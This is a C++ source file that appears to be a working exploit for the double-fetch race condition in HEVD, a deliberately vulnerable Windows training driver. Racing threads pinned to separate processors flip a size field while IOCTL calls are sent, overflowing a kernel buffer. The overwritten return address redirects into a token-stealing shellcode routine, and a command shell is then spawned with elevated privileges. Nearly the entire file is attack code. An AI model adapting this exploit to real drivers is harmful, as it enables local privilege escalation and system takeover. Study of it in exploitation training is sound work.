#include <Windows.h>
#include <iostream>
#include <thread>

#include "Solutions.h"
#include "random_str.h"
#include "DoubleFetch.h"
#include "utils.h"

NTSTATUS Solutions::TriggerDoubleFetch(){
	hHevd = _hDeviceHandle;
	UserDoubleFetch* userDoubleFetch = (UserDoubleFetch*)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
	if (!userDoubleFetch) {
		std::cout << "[-] Could not allocate userDoubleFetch struct" << std::endl;
		return STATUS_NO_MEMORY;
	}

	SIZE_T bufSize = 3000;
	PCHAR buffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
	if (!buffer) {
		std::cout << "[-] Could not allocate buffer" << std::endl;
		return STATUS_NO_MEMORY;
	}

	SYSTEM_INFO systemInfo = { 0 };
	GetSystemInfo(&systemInfo);
	if (systemInfo.dwNumberOfProcessors < 4) {
		std::cout << "[-] You are short in processors, try again later" << std::endl;
		return 0;
	}

	std::cout << "[+] Initializing user struct..." << std::endl;
	userDoubleFetch->buffer = buffer;
	userDoubleFetch->size = 100;

	std::cout << "[+] Initializing buffer with info" << std::endl;
	RtlCopyMemory(userDoubleFetch->buffer, random_str, OVERFLOW_OFFSET);
	*(PULONG)(userDoubleFetch->buffer + OVERFLOW_OFFSET) = (ULONG_PTR)&JumpHere;
	
	do
	{
		HANDLE handles[4] = { 0 };

		for (int i = 0; i < 4; i += 2)
		{
			HANDLE race = CreateThread(NULL, NULL, SizeChaingingThread, &userDoubleFetch->size, CREATE_SUSPENDED, NULL);
			HANDLE ioctl = CreateThread(NULL, NULL, IoctlThread, userDoubleFetch, CREATE_SUSPENDED, NULL);

			if (!SetThreadPriority(race, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(ioctl, THREAD_PRIORITY_TIME_CRITICAL)) {
				std::cout << "[-] Failed setting threads priority - " << GetLastError() << std::endl;
				return STATUS_INVALID_PARAMETER;
			}
			std::cout << "[+] Set thread priority to " << GetThreadPriority(race) << std::endl;

			if (!SetThreadAffinityMask(race, 1 << i) || !SetThreadAffinityMask(ioctl, 1 << i + 1)) {
				std::cout << "[-] Failed setting threads processor - " << GetLastError() << std::endl;
				return STATUS_INVALID_PARAMETER;
			}

			ResumeThread(race);
			ResumeThread(ioctl);

			handles[i] = race;
			handles[i + 1] = ioctl;
		}

		WaitForMultipleObjects(4, handles, true, INFINITE);
	} while (shouldContinue);

	system("cmd.exe");

	return 0;
}

static DWORD WINAPI SizeChaingingThread(LPVOID size) {
	INT32 i = 0;
	std::cout << "[+] running change size thread on processor " << GetCurrentProcessorNumber() << std::endl;
	
	for (i = 0; i < 20000; i++) {
		*(SIZE_T*)size ^= 0x840; // 0x64 ^ 0x840 = 0x824
		Sleep(0.01);
	}

	return 1;
}

static DWORD WINAPI IoctlThread(LPVOID userValue) {
	DWORD bytesReturned = 0;
	INT32 i = 0;
	std::cout << "[+] running ioctl thread on processor " << GetCurrentProcessorNumber() << std::endl;

	for (i = 0; i < 250 && shouldContinue; i++) {
		if (!DeviceIoControl(hHevd, IOCTL_DOUBLE_FETCH, userValue, 3000,
			NULL, NULL, &bytesReturned, NULL)) {
			std::cout << "[-] Could not interact with the driver" << std::endl;
			return STATUS_INVALID_PARAMETER;
		}
	}

	return 1;
}

static VOID JumpHere() {
	shouldContinue = FALSE;

	token_stealing_shellcode();
}